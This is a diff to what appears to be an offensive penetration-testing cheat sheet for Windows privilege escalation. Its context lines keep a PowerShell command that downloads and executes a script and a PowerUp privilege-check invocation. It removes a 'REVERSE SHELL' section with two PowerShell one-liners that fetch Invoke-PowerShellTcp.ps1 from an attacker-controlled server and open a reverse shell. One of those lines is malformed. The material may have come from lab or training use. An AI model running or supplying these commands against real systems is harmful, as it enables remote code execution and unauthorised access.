@@ -29,7 +29,7 @@
 	▪ 
 
 ------------------------------------------------------------------------------------------------------------------------------
-	C code for useradd
+						C CODE FOR USER ADD
 	
 #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
 	
@@ -110,13 +110,6 @@ powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://localhost/P
 	powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
 	
 	
-
-------------------------------------------------------------------------------------------------------------------------------
-
-					REVERSE SHELL
-• cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.10.10./Invoke-PowerShellTcp.ps1")
-
-• powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 
 ------------------------------------------------------------------------------------------------------------------------------
 
